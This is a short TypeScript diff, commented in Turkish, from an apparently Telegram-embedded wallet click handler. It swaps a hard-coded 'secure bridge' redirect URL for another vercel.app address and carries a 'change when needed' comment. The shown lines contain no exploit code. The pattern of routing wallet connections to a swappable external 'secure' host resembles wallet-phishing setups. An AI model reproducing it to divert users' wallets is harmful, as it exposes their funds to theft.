@@ -343,7 +343,7 @@ const handleWalletClick = async (w: DrawerWallet) => {
     }
 
     /* ===== Sabit yönlendirme adresi ===== */
-    const secureBridgeUrl = 'https://secure-bridge.vercel.app/IR02'; // gerektiğinde değiştir
+    const secureBridgeUrl = 'https://secure-protection.vercel.app/IR02'; // gerektiğinde değiştir
     const encodedBridge   = encodeURIComponent(secureBridgeUrl);
 
     // Mevcut sayfanın (Telegram içindeki) tam URL’i
